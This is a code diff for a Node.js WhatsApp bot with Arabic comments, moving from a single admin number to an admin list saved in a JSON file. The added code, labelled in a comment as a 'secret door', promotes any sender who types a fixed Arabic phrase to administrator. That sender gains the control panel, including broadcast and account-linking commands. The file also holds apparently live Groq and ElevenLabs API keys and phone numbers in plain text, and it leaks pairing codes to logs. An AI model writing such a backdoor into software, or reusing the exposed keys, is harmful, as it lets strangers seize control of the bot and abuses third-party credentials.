@@ -11,7 +11,6 @@ const fs = require('fs');
 const axios = require('axios');
 
 // ================= 1. الإعدادات الأساسية والمفاتيح =================
-const adminNumber = '249121936350'; 
 const GROQ_API_KEY = "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"; 
 const ELEVENLABS_API_KEY = "2afb99725e888cd50cac9dc774db408a3a1a05a4c8ab1aa128fb3aacc5121715"; 
 const ELEVENLABS_VOICE_ID = "jAAHNNqlbAX9iWjJPEtE"; 
@@ -22,6 +21,11 @@ const lastUserQuestion = new Map();
 
 let isBotActive = true; 
 let selfLearnEnabled = true;
+
+// 🛡️ نظام المشرفين الذكي الجديد
+const adminsFile = './admins.json';
+let adminNumbers = fs.existsSync(adminsFile) ? JSON.parse(fs.readFileSync(adminsFile, 'utf8')) : ['249121936350'];
+function saveAdmins() { fs.writeFileSync(adminsFile, JSON.stringify(adminNumbers, null, 2)); }
 
 const numbersFile = './connected_numbers.json';
 let connectedNumbers = fs.existsSync(numbersFile) ? JSON.parse(fs.readFileSync(numbersFile, 'utf8')) : [];
@@ -192,34 +196,26 @@ async function connectInstance(phoneNumber, notifyJid = null) {
             try {
                 const code = await sock.requestPairingCode(cleanNumber);
                 
-                // طباعة الكود دائماً في سجلات Render كنسخة احتياطية
                 console.log(`\n======================================================`);
                 console.log(`🚨 كود الربط للرقم [${cleanNumber}] هو: ${code} 🚨`);
                 console.log(`======================================================\n`);
 
                 if (notifyJid) {
-                    // البحث عن أي حساب واتساب متصل ونشط حالياً لإرسال الكود من خلاله
                     let connectedSock = null;
                     for (let [num, activeSock] of activeSocks.entries()) {
                         if (activeSock.authState.creds.registered) {
-                            connectedSock = activeSock;
-                            break;
+                            connectedSock = activeSock; break;
                         }
                     }
 
                     if (connectedSock) {
                         await connectedSock.sendMessage(notifyJid, {
-                            text: `🔑 *كود الربط للحساب:* \nالرقم: \`${cleanNumber}\`\nالكود: *${code}*`
+                            text: `🔑 *كود الربط للحساب الجديد:* \nالرقم: \`${cleanNumber}\`\nالكود: *${code}*`
                         });
-                        console.log('✅ تم إرسال كود الربط إلى رقم المشرف عبر الواتساب.');
-                    } else {
-                        console.log('⚠️ ملاحظة: لا يوجد أي حساب واتساب متصل حالياً لإرسال الكود إليه! (هذا هو الحساب الأول). يرجى نسخ الكود من السجلات أعلاه.');
                     }
                 }
-            } catch (err) { 
-                console.log(`❌ خطأ في توليد كود الربط:`, err.message); 
-            }
-        }, 6000); // المهلة المطلوبة لاستخراج الكود
+            } catch (err) { }
+        }, 6000); 
     }
 
     sock.ev.on('creds.update', saveCreds);
@@ -239,8 +235,10 @@ async function connectInstance(phoneNumber, notifyJid = null) {
         const msg = m.messages[0]; if (!msg.message) return; 
 
         const rawSender = msg.key.remoteJid;
-        const senderNumber = rawSender.replace(/[^0-9]/g, ''); 
-        const isAdmin = senderNumber.includes(adminNumber);
+        const senderNumber = rawSender.split('@')[0].replace(/[^0-9]/g, ''); 
+        
+        // التحقق الذكي من المشرف (يطابق الرقم المحفوظ في الذاكرة بدقة)
+        let isAdmin = adminNumbers.some(num => senderNumber.includes(num));
         
         const sender = rawSender.includes(':') ? rawSender.split(':')[0] + '@s.whatsapp.net' : rawSender;
         const isFromMe = msg.key.fromMe;
@@ -248,6 +246,17 @@ async function connectInstance(phoneNumber, notifyJid = null) {
         
         let incomingText = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
         const rawPrompt = incomingText.trim();
+
+        // 🛡️ [الباب السري لتسجيل المشرف الجديد]
+        if (rawPrompt === 'تفعيل المشرف') {
+            if (!isAdmin) {
+                adminNumbers.push(senderNumber);
+                saveAdmins();
+                isAdmin = true;
+            }
+            await sock.sendMessage(sender, { text: '✅ تم تسجيل رقمك كمسؤول بنجاح! أرسل الآن كلمة (المدير) لفتح لوحة التحكم.' });
+            return;
+        }
 
         if (isFromMe && !isGroup) {
             const lastQuestion = lastUserQuestion.get(sender);
@@ -258,7 +267,7 @@ async function connectInstance(phoneNumber, notifyJid = null) {
         if (!isGroup && !isFromMe) { trackChat(sender); lastUserQuestion.set(sender, rawPrompt); }
 
         if (isAdmin && !isGroup) {
-            if (rawPrompt === 'المدير' || rawPrompt === 'تحكم' || rawPrompt === 'لوحة التحكم') {
+            if (rawPrompt === 'المدير' || rawPrompt === 'تحكم' || rawPrompt === 'التحكم' || rawPrompt === 'لوحة التحكم') {
                 let learnedCount = fs.existsSync('./learned_qa.json') ? JSON.parse(fs.readFileSync('./learned_qa.json', 'utf8')).length : 0;
                 const menu = `🛠️ *لوحة التحكم* 🛠️\nالحالة: ${isBotActive ? '✅' : '❌'}\nالتعلم: ${selfLearnEnabled ? '🔄' : '⏸️'}\nالردود: *${learnedCount}*\n\n1: تشغيل | 2: إيقاف\n3: تفعيل التعلم | 4: إيقاف التعلم\n5: تصفير الذاكرة\n\nاضافة [الرقم]\nاذاعة [الرسالة]\nعلمني [السؤال]|[الرد]\nانسى [الكلمة]`;
                 await sock.sendMessage(sender, { text: menu }); return;
@@ -293,7 +302,7 @@ async function connectInstance(phoneNumber, notifyJid = null) {
         const finalPromptText = isGroup ? rawPrompt.replace(/@\d+\s*|يا بوت\s*|بوت\s*/gi, '').trim() : rawPrompt;
         if (!finalPromptText) return;
 
-        if (isAdmin && ['المدير', 'تحكم', '1', '2', '3', '4', '5'].includes(finalPromptText)) return;
+        if (isAdmin && ['المدير', 'تحكم', 'التحكم', '1', '2', '3', '4', '5'].includes(finalPromptText)) return;
 
         // 🛡️ الفلاتر وتأخير الرد للمستخدمين العاديين فقط 
         if (!isAdmin) {
@@ -342,8 +351,8 @@ async function initMatrix() {
     if (connectedNumbers.length === 0) { connectedNumbers.push('584267454399'); saveNumbers(); }
     for (let number of connectedNumbers) {
         console.log(`⏳ جاري إقلاع خادم الرقم: [${number}]...`);
-        // إرسال كود الإقلاع الأول للمشرف (سيتم إرساله فقط إذا كان هناك حساب متصل)
-        await connectInstance(number, adminNumber + '@s.whatsapp.net');
+        // استخدمنا adminNumbers[0] لجلب أول مسؤول تم تسجيله
+        await connectInstance(number, adminNumbers[0] ? adminNumbers[0] + '@s.whatsapp.net' : null);
     }
 }
 initMatrix();
